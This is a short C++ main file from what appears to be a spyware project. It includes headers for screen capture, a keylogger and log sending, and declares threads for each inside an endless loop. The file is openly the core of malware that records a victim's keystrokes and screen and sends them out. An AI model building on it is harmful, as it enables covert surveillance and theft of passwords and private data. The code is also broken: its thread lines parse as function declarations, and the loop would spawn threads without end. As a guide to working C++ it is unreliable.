#include "Screen.h"
#include "Logger.h"
#include "Send.h"

int main() {
		
	while (true) {
		thread _screenThread(Screen _doScreen);
		thread _loggerThread(Keylogger _doKeyLogging);
		thread _sendThread(Send _doSendLoggs);
	}

	return 0;
}